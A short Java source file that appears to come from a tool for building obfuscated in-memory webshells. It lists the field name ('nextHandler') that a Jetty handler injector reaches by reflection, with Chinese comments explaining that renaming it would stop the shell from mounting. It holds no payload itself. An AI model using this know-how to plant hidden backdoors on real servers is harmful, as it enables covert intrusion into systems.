package com.reajason.javaweb.memshell.obfuscation;

import java.util.Collections;
import java.util.Set;

/**
 * 常用字段契约集合：注入器需要通过反射按名读写的 shell 实例字段。
 * <p>
 * class-obf 没有字段黑名单能力，声明非空即表示该 shell 混淆时整体关闭字段名混淆；
 * 只应声明注入器反射访问的字段，shell 内部字节码自读自写的字段（如 paramName）不需要。
 *
 * @author ReaJason
 */
public final class FieldContracts {

    private FieldContracts() {
    }

    /**
     * Jetty Handler 注入器注入后回填 handler 链：{@code nextHandler} 决定未命中的请求是否继续
     * 交给原 handler。该字段被改名后，注入器按 "nextHandler" 反射取字段失败，马挂载不上。
     * <p>
     * {@code _server} 来自 Jetty AbstractHandler 父类，不在被混淆的 shell 类中，无需声明。
     */
    public static final Set<String> JETTY_HANDLER_FIELDS = Collections.singleton("nextHandler");
}
